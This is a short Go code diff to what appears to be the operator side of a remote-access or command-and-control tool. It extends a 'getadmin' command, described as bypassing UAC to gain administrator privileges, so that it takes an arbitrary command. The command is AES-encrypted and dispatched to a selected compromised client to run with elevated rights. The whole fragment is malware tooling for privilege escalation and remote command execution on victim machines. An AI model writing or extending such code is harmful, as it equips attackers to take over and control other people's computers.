@@ -14,9 +14,14 @@ import (
 var getAdminCmd = &grumble.Command{
 	Name:  "getadmin",
 	Help:  "bypass uac to get system administrator privileges",
-	Usage: "getadmin [-h | --help]",
+	Usage: "getadmin [-h | --help] [-c | --cmd command]",
+	Flags: func(f *grumble.Flags) {
+		f.String("c", "cmd", "", "run the command as an administrator")
+	},
 	Run: func(c *grumble.Context) error {
-		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "getAdmin", "")
+		cmd := c.Flags.String("cmd")
+		data, _ := crypto.Encrypt([]byte(cmd), []byte(config.AesKey))
+		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "getAdmin", data)
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "get admin request failed")
 			return nil
